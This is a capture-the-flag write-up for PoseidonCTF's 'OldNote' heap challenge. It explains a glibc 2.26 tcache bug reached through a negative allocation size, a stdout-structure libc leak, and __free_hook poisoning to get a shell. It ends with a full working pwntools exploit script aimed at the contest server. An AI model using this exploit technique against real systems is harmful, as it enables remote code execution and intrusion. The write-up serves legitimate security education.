# PoseidonCTF

Good quality CTF from `From Sousse, with love`. DiceGang takes second.

Notably I helped with 1 heap, which got 4-5 solves. Unfortunately I had to go
to sleep right before getting libc leaks so OP pepsi on the West Coast solved
submitted, but I solved afterwards for fun.

## OldNote  
> Old, but gold  
>  
> nc poseidonchalls.westeurope.cloudapp.azure.com 9000

Full security checks are in place, so it's a heap chall. The provided libc and
ld are for glibc 2.26, which has tcache included.

The program allows us 4 slots which hold pointers to malloc'ed chunks. We can
only create and delete these chunks, so no easy :leeks:

We also cannot allocate chunks larger than 0x100 size.

### Vuln  
The issue comes down to how the sizes are read. The function to read an int
uses atoi, which returns a *signed* integer. This means we can request to
alloc negative sizes.

However, alloc would return a useless NULL on negative size allocation, right?
Wrong.

We can use [CVE-2017-17426: malloc returns pointer from tcache_get when should
return NULL](https://sourceware.org/bugzilla/show_bug.cgi?id=22375) to get a
chunk back from the first tcache index (0x20 size).

Great, now we have a chunk that we aren't supposed to get. The next step is to
realize that after allocation, we are allowed to write to the chunk up to the
size.

The problem is that a size of -1 will allow us to write basically a huge
amount of bytes to the chunk, easily overflowing the chunk.

## Libc Leak  
Definitely the most difficult part of this chall. As there is no way to read
from a chunk, we can't just get a chunk into unsorted and read from it.

However, [someone has already done](https://vigneshsrao.github.io/babytcache/)
this type of attack that we need!

We just have to write a few bytes of data to `_IO_2_1_stdout_`, which can be
achieved with a 4 bit brute force from a known libc address...

So our plan to leak libc from a high level is:  
- Get a chunk into unsorted bin by overflowing its size from the previous chunk, forging a few chunks to reconnect to the top, and freeing it  
- Overflow the chunk again, and partially overwrite the fwd with a hardcoded `_IO_2_1_stdout_` address  
- Write some data to `_IO_2_1_stdout_` to leak a bunch of addresses on the next print

### Unsorted bin chunk  
To get a chunk into unsorted, we first need to overflow the size (as there's a
<= 0x100 size restriction using the program).

This can be easily done by allocating two 0x10 chunks (will end up in 0x20
tcache), deleting the first chunk, and then allocating a chunk of size -1.

Allocating a chunk of size -1 will pull a chunk from the 0x20 tcache, as well
as giving us a heap overflow.

Let us write the size of our second chunk as 0x420.

Then, we need to forge a chunk at our first chunk + 0x420 so that the free
checks pass. While we're there, let's change the size so that it points back
to the top chunk, so it looks nicer :)

Then, we can free the chunk at index 1 (our unsorted chunk) to write some libc
pointers to the chunk.

### Partial OW  
We can achieve a partial overwrite by allocating a 0x14 sized chunk, and then
overflowing it to write into the unsorted chunk.

The way this works is that when we request a 0x14 sized chunk, the current
tcache index (0x20) is empty, so it pulls from unsorted. When malloc pulls
from an unsorted chunk, it takes out the requested size from the chunk and
returns it.

It also writes libc pointers into the remainder of the original chunk so it
can be kept in the unsorted bin.

We can take advantage of this with our overflow: If we overflow a chunk that
came from unsorted, we'll be writing to the remainder of the unsorted chunk,
that's still in unsorted!

### Writing to stdout data  
Recall that the fwd and bk of a single unsorted chunk point to somewhere in
`main_arena`.

The last 3 nibbles of any `_IO_2_1_stdout_` address are `0x720`. Unfortunately
the fourth to last nibble is not the same from `main_arena` to
`_IO_2_1_stdout_`, so we need to hardcode that nibble and just brute force
until it lines up.

Following the HITCONCTF baby_tcache writeup, we write a `0xfbad1800`, followed
by a bunch of nullbytes (25, to be exact) to `_IO_2_1_stdout_` to leak a lot
of libc pointers. We can recover the base address this way on the next call to
print.

### RCE  
From our libc exploration, we created an unsorted bin chunk, that overlapped
with a couple of tcache chunks that we used to forge a chunk to reconnect to
the top chunk.

We can simply just allocate some chunks from said unsorted bin chunk, which
overlap with some tcache chunk, in order to write to the tcache pointers, in
effect creating a sort of unsorted-tcache bin dup and achieving tcache poison.

We allocate some chunks to get an overlap with a tcache chunk, and then we
write to a previously freed tcache chunk's fwd with `__free_hook`.

Then, we just tcache poison to write to `__free_hook` with `system()`, and
free a chunk with `/bin/sh` in it.

Flag: `Poseidon{g00d_0ld_t1me_wh3n_tc4ch3_1s_571ll_cut3}`

### Script  
```python  
from pwn import *

e = ELF("./oldnote")  
libc = ELF("./libc-2.26.so")  
ld = ELF("./ld-2.26.so")

context.binary = e  
context.terminal = ["konsole", "-e"]

while True:  
   #p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})  
   p = remote("poseidonchalls.westeurope.cloudapp.azure.com", 9000)

   #context.log_level="debug"  
   #gdb.attach(p, """p stdout \n info addr main_arena""")  
  
   def new(size, dat):  
       p.sendlineafter(": ", "1")  
       p.sendlineafter(": ", str(size))  
       p.sendafter(": ", str(dat))

   def remove(idx):  
       p.sendlineafter(": ", "2")  
       p.sendlineafter(": ", str(idx))

   new(0x10, "A")  
   new(0x10, "B")

   for i in range(0x90, 0xd1, 0x10):  
       new(i, "i")  
       remove(2)

   new(0xe0, "i"*0x30+p64(0x421)+p64(0xe0-0x32+3))

   remove(0)

   new(-1, "C"*0x18 + "\x21\x04")

   remove(1)  
  
  
   # tcache for 0x20 is empty so get a chunk in there to pull later  
   new(20, "A")  
   remove(1)  

   new(-1, "A"*16 + p64(0x21) + p64(0x400) + "\x20\xe7")  
  
  
   remove(0)  
  
  
   new(144, "A")  
  
  
  
   new(144, p64(0xfbad1800)+p64(0)*3+"\x00")  
  
   try:  
       dat = p.recvline()  
       libc.address = u64(dat[24:32]) - 0x3d73e0  
   except struct.error:  
       print("skip")  
       continue  
   except EOFError:  
       print("asdf")  
       continue  
  
   print("libc base", hex(libc.address))  
  
  
   remove(0)  
  
  
   new(0xe0, "iiiiiiii")  
  
   remove(0)  
  
   print("libc free hook", hex(libc.sym["__free_hook"]))  
   print("libc system", hex(libc.sym["system"]))  
  
   new(0xf0, "B"*0x50 + p64(0) + p64(0xc1) + p64(libc.sym["__free_hook"]))  
  
   remove(0)  
  
   new(0xb0, "/bin/sh")  
  
   remove(1)  
  
   new(0xb0, p64(libc.sym["system"]))  
  
   remove(0)  
  
  
   p.interactive()  
```  

Original writeup
(https://github.com/joshdabosh/writeups/tree/master/2020-PoseidonCTF).